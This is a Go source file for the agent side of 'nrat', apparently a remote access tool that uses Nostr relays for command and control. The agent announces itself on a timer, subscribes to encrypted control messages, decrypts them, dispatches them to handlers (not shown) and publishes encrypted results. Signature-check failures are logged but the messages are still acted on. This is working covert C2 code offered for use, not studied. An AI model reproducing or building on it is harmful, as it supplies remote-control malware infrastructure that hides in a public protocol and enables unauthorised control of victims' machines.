package agent

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"
	"uw/uboot"
	"uw/ulog"
	"uw/umap"

	"nrat/pkg/nostr"
	"nrat/pkg/nostr/nip04"

	"nrat/model"
	"nrat/utils"
)

var idCacheExpire = 10 * time.Minute

func AgentUint(c *uboot.Context) (e error) {
	if e := c.Require(c.Context(), "unostr"); e != nil {
		return e
	}
	if e := c.Require(c.Context(), "storage"); e != nil {
		return e
	}

	storage, ok := utils.UbootGetAssert[model.Storage[*model.AgentStorageData]](c, "storage")
	if !ok {
		return errors.New("get storage failed")
	}
	unostr, ok := utils.UbootGetAssert[model.Unostr](c, "unostr")
	if !ok {
		return errors.New("get unostr failed")
	}
	shareKey, e := nip04.ComputeSharedSecret(storage.Storage().PublicKey,
		storage.Storage().PrivateKey)
	if e != nil {
		return fmt.Errorf("compute shared secret failed: %w", e)
	}

	agent := &Agent{
		unostr:       unostr,
		eventCh:      make(chan *model.Event, 16),
		selfShareKey: shareKey,
		eventIdCache: umap.NewCache[string, bool](time.Second * 60),
		storage:      storage,
	}

	// 启动时广播自己
	if e := agent.broadcastSelf(c.Context()); e != nil {
		return fmt.Errorf("broadcast self: %w", e)
	}

	broadcastInterval, e := time.ParseDuration(storage.Storage().BroadcastInterval)
	if e != nil || broadcastInterval < 1 {
		ulog.Warn("parse broadcast interval failed or broadcast interval < 1, use default 10m")
		broadcastInterval = 10 * time.Minute
	}

	if e := agent.subscribe(); e != nil {
		return fmt.Errorf("subscribe failed: %w", e)
	}

	// 定期广播自己
	go agent.broadcastSelfLoop(broadcastInterval)

	agent.unostr.SetConnectEvent(func() {
		if e := agent.subscribe(); e != nil {
			ulog.Warn("subscribe failed: %s", e)
		}
	})

	go agent.eventHandler()
	return nil
}

type Agent struct {
	unostr          model.Unostr
	broadcastTicker *time.Ticker
	selfShareKey    []byte
	eventCh         chan *model.Event
	eventUnSub      func()
	eventIdCache    *umap.Cache[string, bool]
	storage         model.Storage[*model.AgentStorageData]
}

func (agent *Agent) broadcastSelfLoop(broadcastInterval time.Duration) {
	if agent.broadcastTicker != nil {
		agent.broadcastTicker.Stop()
		agent.broadcastTicker.Reset(broadcastInterval)
		return
	}

	agent.broadcastTicker = time.NewTicker(broadcastInterval)
	for range agent.broadcastTicker.C {
		if e := agent.broadcastSelf(context.Background()); e != nil {
			ulog.Error("broadcast self ticker: %s", e)
		}
	}
}

func (agent *Agent) broadcastSelf(ctx context.Context) error {
	ev := nostr.Event{
		PubKey:    agent.storage.Storage().PublicKey,
		CreatedAt: nostr.Now(),
		Kind:      nostr.KindSetMetadata,
		Tags: nostr.Tags{
			{"p", agent.storage.Storage().PublicKey},
		},
		Content: "nrat",
	}

	if e := ev.Sign(agent.storage.Storage().PrivateKey); e != nil {
		return fmt.Errorf("sign failed: %w", e)
	}

	status, e := agent.unostr.Relay().Publish(ctx, ev)
	if e != nil {
		return fmt.Errorf("publish failed: %w", e)
	}

	ulog.Debug("publish self status: %s", status)

	if status < 0 {
		return fmt.Errorf("publish failed: %s", status)
	}

	return nil
}

func (agent *Agent) subscribe() error {
	if agent.eventUnSub != nil {
		agent.eventUnSub()
	}

	now := nostr.Now()
	sub, e := agent.unostr.Relay().Subscribe(context.Background(), []nostr.Filter{{
		Kinds:   []int{nostr.KindApplicationSpecificData},
		Authors: []string{agent.storage.Storage().PublicKey},
		Tags:    nostr.TagMap{"d": []string{"control"}},
		Since:   &now,
	}})
	if e != nil {
		return fmt.Errorf("subscribe failed: %w", e)
	}

	agent.eventUnSub = sub.Unsub
	agent.subscribeRange(sub.Events)
	return nil
}

func (agent *Agent) subscribeRange(ch chan *nostr.Event) {
	for ev := range ch {
		if t, e := ev.CheckSignature(); e != nil {
			ulog.Warn("check signature failed: %s", e)
		} else if !t {
			ulog.Warn("signature not match")
		}

		if agent.eventIdCache.Get(ev.ID) {
			ulog.Debug("event id %s already handled", ev.ID)
			continue
		}
		agent.eventIdCache.Set(ev.ID, true, idCacheExpire)

		if ev.CreatedAt.Time().Add(idCacheExpire).Before(time.Now()) {
			ulog.Debug("event id %s expired", ev.ID)
		}

		message, e := nip04.Decrypt(ev.Content, agent.selfShareKey)
		if e != nil {
			ulog.Warn("decrypt event failed: %s", e)
			continue
		}

		evt := &model.Event{
			Id: ev.ID,
		}

		if e := evt.Decode(message); e != nil {
			ulog.Warn("decode event failed: %s", e)
			continue
		}

		evt.Content = strings.TrimSpace(evt.Content)
		agent.eventCh <- evt
	}
}

func (agent *Agent) publish(ctx context.Context, evt *model.Event) error {
	encMessage, e := nip04.Encrypt(evt.Encode(), agent.selfShareKey)
	if e != nil {
		return fmt.Errorf("encrypt failed: %w", e)
	}

	ev := nostr.Event{
		PubKey:    agent.storage.Storage().PublicKey,
		CreatedAt: nostr.Now(),
		Kind:      nostr.KindApplicationSpecificData,
		Tags:      nostr.Tags{{"d", "agent"}},
		Content:   encMessage,
	}

	if e := ev.Sign(agent.storage.Storage().PrivateKey); e != nil {
		fmt.Printf("failed to sign: %s\n", e)
	}

	ret, e := agent.unostr.Relay().Publish(ctx, ev)
	if e != nil {
		return fmt.Errorf("publish failed: %w", e)
	}

	if ret < 0 {
		return fmt.Errorf("publish failed: %s", ret)
	}

	return nil
}

func (agent *Agent) eventHandler() {
	for ev := range agent.eventCh {
		if h, ok := agentHandlers[ev.Type]; ok && h != nil {
			if ret, e := h(agent, ev); ret != "" || e != nil {
				evt := &model.Event{
					Type:    ev.Type,
					Content: ret,
				}

				if e != nil {
					evt.Error = e.Error()
					ulog.Warn("handle %s event failed: %s", ev.Type, e)
				}

				ctx, cancel := context.WithTimeout(context.Background(),
					agent.unostr.ConnectTimeout())
				if e := agent.publish(ctx, evt); e != nil {
					ulog.Warn("handle event failed: %s", e)
				}
				cancel()
			}
			continue
		}

		ulog.Warn("unknown event type: %s", ev.Type)
	}
}
